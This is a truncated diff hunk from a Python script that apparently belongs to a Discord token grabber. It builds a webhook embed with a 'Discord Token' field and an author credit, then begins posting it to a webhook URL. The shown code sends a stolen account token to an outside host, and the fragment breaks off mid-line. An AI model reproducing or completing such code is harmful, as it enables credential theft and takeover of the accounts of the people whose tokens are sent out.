@@ -97,3 +97,8 @@ if __name__ == "__main__":
         "timestamp": datetime.utcnow().isoformat(),
         "fields": [
             {"name": "Discord Token", "value": f"
+            ],
+        "footer": {"text": "Made by Hyper and Sensai Ryzen"}
+    }
+
+    requests.post(WEBHOOK_URL, json={"embed
